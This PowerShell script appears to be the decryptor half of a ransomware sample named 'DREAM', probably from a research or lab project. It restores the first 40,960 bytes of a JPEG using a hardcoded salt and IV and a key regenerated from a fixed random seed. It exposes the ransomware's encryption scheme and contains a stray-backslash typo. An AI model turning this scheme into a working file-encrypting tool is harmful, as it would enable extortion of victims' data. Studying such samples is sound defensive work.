function DecryptFile($fileBytes, $key, $salt, $IV){
    $RijndaelObject = New-Object System.Security.Cryptography.RijndaelManaged
    $keyBytes = [Text.Encoding]::UTF8.GetBytes($key)
    $saltBytes = [Text.Encoding]::UTF8.GetBytes($salt)
    $RijndaelObject.Key = (New-Object Security.Cryptography.PasswordDeriveBytes $keyBytes, $saltBytes, "SHA1", 5).GetBytes(32)
    $RijndaelObject.IV = (New-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($IV) )[0..15]

    $RijndaelObject.Padding="Zeros"
    $RijndaelObject.Mode="CBC"
    $dy = $RijndaelObject.CreateDecryptor()
    $ms = New-Object IO.MemoryStream
    $cs = New-Object Security.Cryptography.CryptoStream $ms, $dy, "Write"
    $cs.Write($fileBytes, 0, $fileBytes.Length)
    $cs.Close()
    $ms.Close()
    $RijndaelObject.Clear()
    return $ms.ToArray()
}

$key = (get-random -SetSeed 1 -count 50 -input (48..57 + 65..90 + 97..122) | foreach-object -begin { $pass = $null; } -process {$pass += [char]$_;} -end {$pass});
Write-Output $key
$salt="DREAM hacks you!";
$IV="DREAM INIT";
$encryptedFileBytes = (Get-Content -Path 'C:\Users\Francesco\Desktop\Ransomware\Utils\original.jpeg' -Encoding Byte) | select -First 40960;
$decyptedFileBytes = DecryptFile $encryptedFileBytes $key $salt $IV

$file=[io.file]::Open('C:\Users\Francesco\Desktop\Ransomware\Utils\original.jpeg', 'Open', 'ReadWrite');
if ($file.Length -lt "40960"){
    $bytesToEncode=\$file.Length;
}
else{
    $bytesToEncode="40960";
}
[byte[]]$fileBytes = new-object byte[] $bytesToEncode;
$readFile = $file.Read($fileBytes, 0, $fileBytes.Length)
$file.Position='0';
$encryptedBytes = DecryptFile $fileBytes $key $salt $IV;
$file.Write($decyptedFileBytes, 0, $decyptedFileBytes.Length);
$file.Close();
# ren -Path ".\original.jpeg.xxx" -NewName "original.jpeg" -Force;

exit 0
